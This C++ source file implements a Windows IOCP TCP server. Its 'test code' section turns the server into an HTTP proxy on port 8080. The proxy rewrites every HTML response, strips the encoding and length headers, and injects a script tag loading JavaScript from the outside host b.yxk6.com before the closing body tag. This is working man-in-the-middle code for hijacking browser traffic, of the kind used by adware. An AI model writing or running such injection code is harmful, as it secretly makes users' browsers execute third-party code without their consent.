// IOCP.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#include <WinSock2.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib")

#include "CSLock.h"
#include "UserHandle.h"
#include "HelpFun.h"
#include "IOCPTcpClient.h"
#include "IOCPClientManager.h"




typedef struct tagIOCP_TCP_SERVER_PARAM
{
	IOCP_TCP_CALLBACK IOCPCallback;
	UINT nListenPort;
	HANDLE hIOCompletionPort;
	HANDLE hEvent;
	BOOL bStartRes;
}IOCP_TCP_SERVER_PARAM,*PIOCP_TCP_SERVER_PARAM;

CIOCPClientManager g_ClientManager;

HANDLE GetIOCPHandle( HANDLE hIOCPServer )
{
	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
	return pIOCPTcpServer->hIOCompletionPort;
}

IOCP_TCP_CALLBACK *GetIOCPCallbacks(HANDLE hIOCPServer)
{
	PIOCP_TCP_SERVER_PARAM pIOCPTcpServer = (PIOCP_TCP_SERVER_PARAM)hIOCPServer;
	return &(pIOCPTcpServer->IOCPCallback);
}

DWORD WINAPI IOCPWorkThread(LPVOID lpParam)
{
	PIOCP_TCP_SERVER_PARAM pServerParam = (PIOCP_TCP_SERVER_PARAM)lpParam;
	DWORD dwReturnBits=0;

	while ( TRUE )
	{
		PWSAOVERLAPPEDEX pOverLappedEx=NULL;

		HANDLE hClient = NULL;
		
		BOOL bRet = GetQueuedCompletionStatus(pServerParam->hIOCompletionPort,&dwReturnBits,(PULONG_PTR)&hClient,(LPWSAOVERLAPPED *)&pOverLappedEx,INFINITE);

		if ( dwReturnBits > 0 )
		{
			g_ClientManager.OnDataTransfer(hClient,pOverLappedEx,dwReturnBits);
		}
		else if( dwReturnBits == 0 )
		{
			g_ClientManager.DestoryIOCPClient(hClient);
		}
	}

	return 0;
}

DWORD WINAPI IOCPTcpServerAcceptThread( PVOID pParam )
{
	PIOCP_TCP_SERVER_PARAM pServerParam = (PIOCP_TCP_SERVER_PARAM)pParam;
	
	WSADATA wsaData;
	SOCKET AcceptSocket = INVALID_SOCKET;
	HANDLE hIOCompletionPort = NULL;

	do 
	{
		if (pServerParam == NULL)
		{
			break;
		}

		pServerParam->bStartRes = FALSE;
		
		WSAStartup(MAKEWORD(2,2),&wsaData);
		
		AcceptSocket = WSASocket(AF_INET,SOCK_STREAM,0,NULL,0,WSA_FLAG_OVERLAPPED);
		
		if(AcceptSocket == INVALID_SOCKET)
		{
			break;
		}

		SOCKADDR_IN InternetAddr;
		InternetAddr.sin_family = AF_INET;
		InternetAddr.sin_addr.s_addr = htonl(INADDR_ANY);
		InternetAddr.sin_port = htons(pServerParam->nListenPort);

		if ( SOCKET_ERROR == bind(AcceptSocket, (PSOCKADDR) &InternetAddr, sizeof(InternetAddr)) )
		{
			break;
		}
		
		if(SOCKET_ERROR == listen(AcceptSocket,500) )
		{
			break;
		}

		hIOCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0 );//创建完成端口
		if ( NULL == hIOCompletionPort )
		{
			break;
		}

		pServerParam->hIOCompletionPort = hIOCompletionPort;
	
		for ( int i=0;i<10;i++ )
		{
			HANDLE hIOCPWorkThread = CreateThread(NULL,0,IOCPWorkThread,pServerParam,0,NULL);
			CloseHandle(hIOCPWorkThread);
		}

		pServerParam->bStartRes = TRUE;

	} while (FALSE);

	SetEvent(pServerParam->hEvent);
	
	if ( pServerParam->bStartRes )
	{
		while (TRUE)
		{
			sockaddr sa;
			ZeroMemory(&sa,sizeof(sa));
			sa.sa_family=AF_INET;
			int len = sizeof(sa);
			SOCKET clientsock = WSAAccept(AcceptSocket,&sa,&len,NULL,0);

			HANDLE hClient = g_ClientManager.CreateIOCPClient(clientsock,&(pServerParam->IOCPCallback));

			if(g_ClientManager.JoinIOCP(hClient,hIOCompletionPort))
			{
				pServerParam->IOCPCallback.pClientConnect(hClient,(sockaddr_in *)&sa);
				g_ClientManager.PostRecvRequest(hClient);
			}

			
		}
	}

	if ( INVALID_SOCKET != AcceptSocket )
	{
		closesocket(AcceptSocket);
	}

	return 0;
}

HANDLE CreateIOCPTcpServer( UINT nListenPort , PIOCP_TCP_CALLBACK pTcpCallbacks)
{
	PIOCP_TCP_SERVER_PARAM pServerParam = new IOCP_TCP_SERVER_PARAM;

	memcpy_s(&(pServerParam->IOCPCallback),sizeof(pServerParam->IOCPCallback),pTcpCallbacks,sizeof(pServerParam->IOCPCallback));

	pServerParam->bStartRes = FALSE;
	pServerParam->hEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
	pServerParam->nListenPort = nListenPort;

	CreateThread(NULL,0,IOCPTcpServerAcceptThread,pServerParam,0,NULL);

	WaitForSingleObject(pServerParam->hEvent,INFINITE);
	
	return pServerParam;
}

///////////////////////////////////////////////////////////////////////////////////
//测试代码

#include "HttpSendParser.h"
#include ".\Http数据解析\HttpDataParser.h"

typedef struct tagCALLBACK_PARAM
{
	BOOL bReplaceData;
	HANDLE hRemote;
}CALLBACK_PARAM,*PCALLBACK_PARAM;

 typedef struct tagCLIENT_DATA
 {
 	CStringA strHeadBuffer;
 	HANDLE   hRemote;
	CHttpDataParser *pHttpDataParser;
	CALLBACK_PARAM CallbackParam;
	BOOL bServerToClient;
 }CLIENT_DATA,*PCLIENT_DATA;

HANDLE hIOCPServer = NULL;


CStringA g_strJsUrl="http://b.yxk6.com/qm20160728.js";

VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL bHeadData,BOOL bFinalData)
{
	PCALLBACK_PARAM pCallbackParam = (PCALLBACK_PARAM)pParam;

	if ( NULL == pData || nDataLen == 0 )
	{
		return ;
	}

	if (bHeadData)
	{
		pCallbackParam->bReplaceData = FALSE;

		CHttpRecvParser recvParser;
		if(recvParser.ParseData((const char *)pData,nDataLen))
		{
			if (recvParser.GetResponseCode() == "200")
			{
				CStringA strContentType;
				strContentType = recvParser.GetValueByName("Content-Type");
				if (strContentType.Find("text/html") >= 0 )
				{
					recvParser.DelResponseNode("Content-Encoding");
					recvParser.DelResponseNode("Content-Length");
					recvParser.DelResponseNode("Transfer-Encoding");
					recvParser.AddResponseNode("Transfer-Encoding","chunked");

					pCallbackParam->bReplaceData = TRUE;

					CStringA strNewBuffer;
					recvParser.BuildBuffer(strNewBuffer);
					
					g_ClientManager.PostSendRequest(pCallbackParam->hRemote,(BYTE *)strNewBuffer.GetBuffer(),strNewBuffer.GetLength(),NULL);
				}
			}

		}
	}
	else
	{
		if (pCallbackParam->bReplaceData)
		{
			CStringA strTempData;
			strTempData.Append((LPCSTR)pData,nDataLen);

			CStringA strReplaceData;
			strReplaceData.Format("<script src=\"%s\"></script></body>",g_strJsUrl);
			strTempData.Replace("</body>",strReplaceData);

			CStringA strChunkData;
			strChunkData.Format("%x\r\n%s\r\n",strTempData.GetLength(),strTempData.GetBuffer());

			g_ClientManager.PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);

			if (bFinalData)
			{
				strChunkData = "0\r\n\r\n";
				g_ClientManager.PostSendRequest(pCallbackParam->hRemote,(BYTE *)strChunkData.GetBuffer(),strChunkData.GetLength(),NULL);
			}

		}
	}


}

VOID WINAPI ClientConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
{
	PCLIENT_DATA pClientData = new CLIENT_DATA;
	pClientData->hRemote = NULL;
	pClientData->strHeadBuffer = "";
	pClientData->CallbackParam.bReplaceData = FALSE;
	pClientData->CallbackParam.hRemote = NULL;
	pClientData->pHttpDataParser = NULL;
	pClientData->bServerToClient = FALSE;
	g_ClientManager.SetUserParam(hClient,pClientData);

}
VOID WINAPI ClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
{
	PCLIENT_DATA pClientData = (PCLIENT_DATA)pUserParam;
	if(pClientData)
	{
		if (pClientData->pHttpDataParser)
		{
			delete pClientData->pHttpDataParser;
		}

		DWORD dwSendPendingLen = g_ClientManager.GetSendPendingLen(pClientData->hRemote);
		if ( dwSendPendingLen == 0 )
		{
			g_ClientManager.DestoryIOCPClient( pClientData->hRemote );
		}
		else
		{
			int a=0;
		}
		
		//

		//DebugStringW(L"Delete The pClientData Ptr 0x%x",pClientData);

		delete pClientData;
	}
}

VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
{

	PCLIENT_DATA pClientData = (PCLIENT_DATA)pUserParam;
	if (pClientData && pClientData->hRemote)
	{
		
  		if ( pClientData->bServerToClient )
  		{
  			BOOL bFinalData = FALSE;
  			pClientData->pHttpDataParser->ParseRecvData( pDataBuffer,dwDataLen,&bFinalData);
  			if (bFinalData)
  			{
  				pClientData->pHttpDataParser->ResetParser();
  			}
  		}
		
		if (  FALSE == pClientData->CallbackParam.bReplaceData )
		{
			g_ClientManager.PostSendRequest(pClientData->hRemote,pDataBuffer,dwDataLen,NULL);
		}
		
		return ;
	}
	
	if ( pClientData && pClientData->hRemote == NULL )
	{
		pClientData->strHeadBuffer.Append((LPCSTR)pDataBuffer,dwDataLen);

		CHttpSendParser parser;
		if(parser.ParseData( pClientData->strHeadBuffer.GetBuffer(),pClientData->strHeadBuffer.GetLength()))
		{
			CStringA strHost;
			strHost = parser.GetHost();

			BOOL bRemoteRes = FALSE;
			HANDLE hRemote = NULL;
			
			PCLIENT_DATA pRemoteData = NULL;
			do 
			{
				hRemote = g_ClientManager.CreateIOCPClient(GetIOCPCallbacks(hIOCPServer));
				if ( NULL == hRemote )
				{
					DebugStringW(L"g_ClientManager.CreateIOCPClient Error");
					break;
				}

				if( FALSE == g_ClientManager.Connect(hRemote,strHost,80))
				{
					DebugStringW(L"g_ClientManager.Connect Error");
					break;
				}

				if ( FALSE == g_ClientManager.JoinIOCP(hRemote,GetIOCPHandle(hIOCPServer)))
				{
					DebugStringW(L"g_ClientManager.JoinIOCP Error");
					break;
				}

				if ( FALSE == g_ClientManager.PostSendRequest(hRemote,(BYTE *)pClientData->strHeadBuffer.GetBuffer(),pClientData->strHeadBuffer.GetLength() , NULL))
				{
					DebugStringW(L"g_ClientManager.PostSendRequest Error");
					break;
				}

				pClientData->strHeadBuffer = "";

				if ( FALSE == g_ClientManager.PostRecvRequest(hRemote))
				{
					DebugStringW(L"g_ClientManager.PostRecvRequest Error");
					break;
				}

				pClientData->hRemote = hRemote;

				pRemoteData = new CLIENT_DATA;
				pRemoteData->hRemote = hClient;
				pRemoteData->strHeadBuffer = "";
				pRemoteData->CallbackParam.bReplaceData = FALSE;
				pRemoteData->CallbackParam.hRemote = hClient;
				pRemoteData->pHttpDataParser = new CHttpDataParser(DataRecvedCallback,&(pRemoteData->CallbackParam));
				pRemoteData->bServerToClient = TRUE;

				pClientData->CallbackParam.hRemote = hRemote;

				g_ClientManager.SetUserParam(hRemote , (PVOID)pRemoteData);

				bRemoteRes = TRUE;
			} while (FALSE);

			if ( FALSE == bRemoteRes )
			{
				if (hRemote)
				{
					g_ClientManager.DestoryIOCPClient(hRemote);
				}
			}

		}

	}
}



int _tmain(int argc, _TCHAR* argv[])
{
	{
		//CreateThread(NULL,0,TestThread,NULL,0,NULL);
	}

	IOCP_TCP_CALLBACK TcpCallback;
	TcpCallback.pClientConnect = ClientConnectCallback ;
	TcpCallback.pClientDisConnect = ClientDisConnectCallback ;
	TcpCallback.pDataRecv = DataRecvCallback;

	hIOCPServer = CreateIOCPTcpServer(8080,&TcpCallback);

	while (1)
	{
		Sleep(1000);
	}

	return 0;
}

